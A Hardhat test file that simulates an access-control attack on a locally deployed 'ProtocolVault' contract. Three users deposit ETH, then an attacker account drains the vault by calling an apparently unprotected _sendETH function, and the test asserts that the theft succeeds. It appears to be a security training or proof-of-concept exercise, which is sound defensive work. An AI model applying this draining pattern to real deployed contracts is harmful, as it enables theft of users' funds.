import { expect } from "chai";
import { network } from "hardhat";

const { ethers } = await network.connect();

describe("Access-Control-Attack-Simulation-1",async function(){

    let deployer:any,user1:any,user2:any,user3:any,attacker:any;

    const DEPOSIT_AMOUNT = ethers.parseUnits("20");

    before(async function(){
        [deployer,user1,user2,user3,attacker] = await ethers.getSigners();

        this.attackerInitialBalance = await ethers.provider.getBalance(attacker.address);
        const vaultFactory = await ethers.getContractFactory("ProtocolVault",deployer);
        this.vault = await vaultFactory.deploy();
        await this.vault.waitForDeployment();

        await user1.sendTransaction({
            to:this.vault,
            value:DEPOSIT_AMOUNT
        });

        await user2.sendTransaction({
            to:this.vault,
            value:DEPOSIT_AMOUNT
        });

        await user3.sendTransaction({
            to:this.vault,
            value:DEPOSIT_AMOUNT
        });

        let currVaultBalance = await ethers.provider.getBalance(this.vault.target);

        expect(this.attackerInitialBalance).to.be.equal(await ethers.provider.getBalance(attacker.address));
        expect(currVaultBalance).to.be.equal(DEPOSIT_AMOUNT+DEPOSIT_AMOUNT+DEPOSIT_AMOUNT);
        expect(this.vault.connect(attacker).withDrawEth()).to.be.revert(ethers);

    });

    it("Attacking the Vault",async function(){
        await this.vault.connect(attacker)._sendETH(attacker.address);
    });

    after(async function(){
        expect(await ethers.provider.getBalance(this.vault.target)).to.be.equal(0);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt((this.attackerInitialBalance) + DEPOSIT_AMOUNT + DEPOSIT_AMOUNT + DEPOSIT_AMOUNT - (ethers.parseUnits("0.2")));
    });

});